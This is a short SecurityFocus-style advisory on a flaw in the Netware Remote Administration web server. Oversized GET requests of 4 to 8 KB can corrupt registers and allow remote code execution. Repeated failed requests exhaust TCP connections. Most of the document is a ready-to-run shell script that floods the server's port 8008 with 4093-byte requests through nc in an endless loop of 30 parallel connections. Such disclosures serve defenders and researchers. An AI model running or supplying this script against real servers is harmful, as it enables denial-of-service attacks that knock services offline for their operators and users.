source: http://www.securityfocus.com/bid/1118/info


The Netware Remote Administration utility can be compromised to allow arbitrary code to be remotely run on the server.

The Remote Administration server is basically a simple webserver, and if sent a GET request of between 4 and 8 kb, some of the data gets written to executable registers.

Even without executable code being sent, this can lead to a DoS as although the server will not crash, the connection will not be aborted or cleaned. Therefore, these failed requests can be made repeatedly until the TCP/IP subsystem will no longer accept connection requests. 

#!/bin/sh

SERVER=127.0.0.1
PORT=8008
WAIT=3

DUZOA=`perl -e '{print "A"x4093}'`
MAX=30

while :; do
  ILE=0
  while [ $ILE -lt $MAX ]; do
    (
      (
        echo "GET /"
        echo $DUZOA
        echo
      ) | nc $SERVER $PORT &
      sleep $WAIT
      kill -9 $!
    ) &>/dev/null &
    ILE=$[ILE+1]
  done
  sleep $WAIT
done